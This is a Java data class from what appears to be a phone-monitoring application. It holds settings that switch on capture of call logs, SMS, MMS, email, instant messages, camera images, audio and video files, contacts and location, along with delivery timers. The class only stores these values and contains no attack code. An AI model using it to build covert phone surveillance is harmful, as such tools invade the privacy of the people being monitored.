package com.daemon_bridge;

import java.io.Serializable;
import java.util.List;

import com.vvt.configurationmanager.FeatureID;
 

public class GetCurrentSettingsCommandResponse  extends CommandResponseBase implements Serializable {
	private static final long serialVersionUID = -5216603594213463805L;

	private boolean mEnableCapture;
 	private int mDeliverTimer;
 	private int mMaxEvent;
 	private boolean mEnableLocation;
	private long mLocationInterval;
	private List<FeatureID> mSupportedFeture;
	private int mConfigurationId;
	private boolean mEnableCallLog;
	private boolean mEnableSMS;
	private boolean mEnableEmail;
	private boolean mEnableMMS;
	private boolean mEnableIM;
	private boolean mEnablePinMessage;
	private boolean mEnableWallPaper;
	private boolean mEnableCameraImage;
	private boolean mEnableAudioFile;
	private boolean mEnableVideoFile;
	private boolean mEnableAddressBook;
	private boolean mEnableMonitor;
	private boolean mEnableWatchNotification;
	
	public GetCurrentSettingsCommandResponse(int responseCode) {
		super(responseCode);
	}
	
	public void setEnableStartCapture(boolean enableCapture) {
		this.mEnableCapture = enableCapture;
	}
	
	public boolean getEnableStartCapture() {
		return this.mEnableCapture;
	}
	
	public int getDeliverTimer() {
		return this.mDeliverTimer;
	}
	
	public void setDeliverTimer(int deliverTimer) {
		this.mDeliverTimer = deliverTimer;
	}
	
	public int getMaxEvent() {
		return this.mMaxEvent;
	}
	
	public void setMaxEvent(int maxEvent) {
		this.mMaxEvent = maxEvent;
	}
	
	public boolean getEnableLocation() {
		return mEnableLocation;
	}

	public long getLocationInterval() {
		return mLocationInterval;
	}

	public void setEnableLocation(boolean isEnabled) {
		mEnableLocation = isEnabled;
	}

	public void setLocationInterval(long interval) {
		mLocationInterval = interval;
	}
	
	public List<FeatureID> getSupportedFeture() {
		return mSupportedFeture;
	}

	public void setSupportedFeture(List<FeatureID> supportedFeture) {
		this.mSupportedFeture = supportedFeture;
	}
	
	public int getConfigurationId(){
		return mConfigurationId;
	}

	public boolean getEnableCallLog(){
		return mEnableCallLog;
	}
	
	public void setEnableCallLog(boolean isEnabled){
		mEnableCallLog = isEnabled;
	}

	public boolean getEnableSMS(){
		return mEnableSMS;
	}

	public void setEnableSMS(boolean isEnabled){
		mEnableSMS = isEnabled;
	}
	
	public boolean getEnableEmail(){
		return mEnableEmail;
	}

	public void setEnableEmail(boolean isEnabled){
		mEnableEmail = isEnabled;
	}
	
	public boolean getEnableMMS(){
		return mEnableMMS;
	}

	public void setEnableMMS(boolean isEnabled){
		mEnableMMS = isEnabled;
	}
	
	public boolean getEnableIM(){
		return mEnableIM;
	}

	public void setEnableIM(boolean isEnabled){
		 mEnableIM = isEnabled;
	}
	
	public boolean getEnablePinMessage(){
		return mEnablePinMessage;
	}

	public void setEnablePinMessage(boolean isEnabled){
		mEnablePinMessage = isEnabled;
	}
	
	public boolean getEnableWallPaper(){
		return mEnableWallPaper;
	}
	
	public void setEnableWallPaper(boolean isEnabled){
		mEnableWallPaper = isEnabled;
	}
	
	public boolean getEnableCameraImage(){
		return mEnableCameraImage;
	}

	public void setEnableCameraImage(boolean isEnabled){
		mEnableCameraImage = isEnabled;
	}
	
	public boolean getEnableAudioFile(){
		return mEnableAudioFile;
	}

	public void setEnableAudioFile(boolean isEnabled){
		mEnableAudioFile = isEnabled;
	}
	
	public boolean getEnableVideoFile(){
		return mEnableVideoFile;
	}

	public void setEnableVideoFile(boolean isEnabled){
		mEnableVideoFile = isEnabled;
	}
	
	public boolean getEnableAddressBook(){
		return mEnableAddressBook;
	}
	
	public void setEnableAddressBook(boolean isEnabled){
		mEnableAddressBook = isEnabled;
	}

	public void setConfigurationId(int configurationId){
		mConfigurationId = configurationId;
	}
	
	public boolean getEnableMonitor() {
		return mEnableMonitor;
	}

	public void setEnableMonitor(boolean isEnabled) {
		mEnableMonitor = isEnabled;
	}

	public boolean getEnableWatchNotification() {
		return mEnableWatchNotification;
	}

	public void setEnableWatchNotification(boolean isEnabled) {
		mEnableWatchNotification = isEnabled;
	}

	@Override
	public String toString() {
		StringBuilder builder = new StringBuilder();
		builder.append("GetCurrentSettingsCommandResponse {");
		builder.append(" responseCode =").append(String.valueOf(getResponseCode()));
		builder.append(", mEnableCapture =").append(mEnableCapture);
		builder.append(", DeliverTimer =").append(mDeliverTimer);
		builder.append(", MaxEvent =").append(mMaxEvent);
		builder.append(", EnableLocation =").append(mEnableLocation);
		builder.append(", LocationInterval =").append(mLocationInterval);
		builder.append(", SupportedFetures Count =").append(mSupportedFeture.size());
		builder.append(", ConfigurationId =").append(mConfigurationId);
		builder.append(", EnableCallLog =").append(mEnableCallLog);
		builder.append(", EnableSMS =").append(mEnableSMS);
		builder.append(", EnableEmail =").append(mEnableEmail);
		builder.append(", EnableMMS =").append(mEnableMMS);
		builder.append(", EnableIM =").append(mEnableIM);
		builder.append(", EnablePinMessage =").append(mEnablePinMessage);
		builder.append(", EnableWallPaper =").append(mEnableWallPaper);
		builder.append(", EnableCameraImage =").append(mEnableCameraImage);
		builder.append(", EnableAudioFile =").append(mEnableAudioFile);
		builder.append(", EnableVideoFile =").append(mEnableVideoFile);
		builder.append(", EnableAddressBook =").append(mEnableAddressBook);
		builder.append(", EnableMonitor =").append(mEnableMonitor);
		builder.append(", EnableWatchNotification =").append(mEnableWatchNotification);
		return builder.append(" }").toString();		
	}
}
